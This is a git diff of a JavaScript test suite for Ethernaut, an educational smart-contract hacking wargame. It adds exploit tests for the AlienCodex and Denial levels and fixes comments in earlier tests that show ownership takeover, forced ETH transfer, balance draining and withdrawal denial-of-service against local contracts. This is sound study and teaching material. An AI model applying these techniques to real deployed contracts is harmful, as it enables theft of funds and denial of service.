@@ -29,6 +29,10 @@ const Recovery             = artifacts.require("Recovery");
 const RecoveryExploit      = artifacts.require("RecoveryExploit");
 const MagicNumber          = artifacts.require("MagicNumber");
 const MagicNumberExploit   = artifacts.require("MagicNumberExploit");
+const AlienCodex           = artifacts.require("AlienCodex");
+const AlienCodexExploit    = artifacts.require("AlienCodexExploit");
+const Denial               = artifacts.require("Denial");
+const DenialExploit        = artifacts.require("DenialExploit");
 
 const { expectRevert }       = require('@openzeppelin/test-helpers');
 const { getContractAddress } = require("@ethersproject/address");
@@ -61,7 +65,7 @@ contract("Ethernaut", (accounts) => {
 		});
 		it("Exploit", async () => {
 			const contract = await Fallback.new();
-			await contract.contribute({ from: hacker, value: amount }); // sned amount less than 0.001 ether to bypass "require" in the next call
+			await contract.contribute({ from: hacker, value: amount }); // send amount less than 0.001 ether to bypass "require" in the next call
 			await web3.eth.sendTransaction({ from: hacker, to: contract.address, value: amount, data: null }); // trigger the receive() function to set the hacker as the new owner
 			const ownerCurrent = await contract.owner();
 			assert.equal(hacker, ownerCurrent, "Failed to pass level 1.");
@@ -181,7 +185,7 @@ contract("Ethernaut", (accounts) => {
 			const exploit = await ForceExploit.new();
 			const balanceOld = await web3.eth.getBalance(contract.address);
 			await web3.eth.sendTransaction({ from: hacker, to: exploit.address, value: amount, data: null }); // send some balance to the exploit contract using the receive() function
-			await exploit.destroy(contract.address, { from: hacker }); // forcefully send all the balance from the exploit contract to the target contract using selfdestruct() function
+			await exploit.destroy(contract.address); // forcefully send all the balance from the exploit contract to the target contract using selfdestruct() function
 			const balanceNew = await web3.eth.getBalance(contract.address);
 			assert.equal(balanceNew - balanceOld, amount, "Failed to pass level 7."); // make the target's contract balance greater than zero to pass the level
 		});
@@ -361,7 +365,7 @@ contract("Ethernaut", (accounts) => {
 			await exploit.run(targetAddress, hacker);
 			const balanceTargetCurrent = await web3.eth.getBalance(targetAddress);
 			const balanceHackerNew = await web3.eth.getBalance(hacker);
-			assert(balanceHackerNew > balanceHackerOld, "Failed to pass level 17."); // steal the whole balance to pass the level
+			assert(balanceHackerNew > balanceHackerOld, "Failed to pass level 17."); // withdraw the whole balance to pass the level
 			assert.equal(balanceTargetCurrent, 0, "Failed to pass level 17.");
 		});
 	});
@@ -380,9 +384,46 @@ contract("Ethernaut", (accounts) => {
 			assert(await contract.validate(), "Failed to pass level 18.");
 			// another example without exploit contract
 			// const bytecode = "0x600A600C600039600A6000F3602A60005260206000F3";
-			// const txn = await web3.eth.sendTransaction({ from: hacker, data: bytecode }); // to create a smart contract, send transaction without the recipient
+			// const txn = await web3.eth.sendTransaction({ from: hacker, data: bytecode }); // to create a smart contract, send a transaction without the recipient
 			// await contract.setSolver(txn.contractAddress);
 			// assert(await contract.validate(), "Failed to pass level 18.");
+		});
+	});
+
+	describe("Level 19 - AlienCodex", async () => {
+		it("Deploy AlienCodex and AlienCodexExploit Contracts", async () => {
+			let deployed = await AlienCodex.deployed();
+			assert(deployed, "MagicNumber contract is not deployed.");
+			deployed = await AlienCodexExploit.deployed();
+			assert(deployed, "MagicNumberExploit contract is not deployed.");
+		});
+		it("Exploit", async () => {
+			const contract = await AlienCodex.new();
+			const exploit = await AlienCodexExploit.new();
+			// await exploit.run(contract.address, { from: hacker });
+			// const ownerCurrent = await contract.owner();
+			// assert.equal(hacker, ownerCurrent, "Failed to pass level 19.");
+			await expectRevert.unspecified(exploit.run(contract.address, { from: hacker })); // solidity v0.8.0+ is immune to array length underflows and overflows and will revert any such transaction
+		});
+	});
+
+	describe("Level 20 - Denial", async () => {
+		it("Deploy Denial and DenialExploit Contracts", async () => {
+			let deployed = await Denial.deployed();
+			assert(deployed, "MagicNumber contract is not deployed.");
+			deployed = await DenialExploit.deployed();
+			assert(deployed, "MagicNumberExploit contract is not deployed.");
+		});
+		it("Exploit", async () => {
+			const contract = await Denial.new();
+			const exploit = await DenialExploit.new();
+			await web3.eth.sendTransaction({ from: owner, to: contract.address, value: amount, data: null }); // deposit some ETH to the target's contract
+			await contract.setWithdrawPartner(exploit.address); // set the hacker's contract as the partner, hacker's contract will always revert on target's contract withdrawal
+			// await exploit.run(contract.address)
+			const balanceOld = await contract.contractBalance();
+			await expectRevert.unspecified(contract.withdraw(), { gas: 128}); // DoS the withdrawal to pass the level
+			const balanceNew = await contract.contractBalance();
+			assert.equal(balanceOld, balanceNew, "Failed to pass level 20."); // balance must stay unchanged to pass the level
 		});
 	});
 });
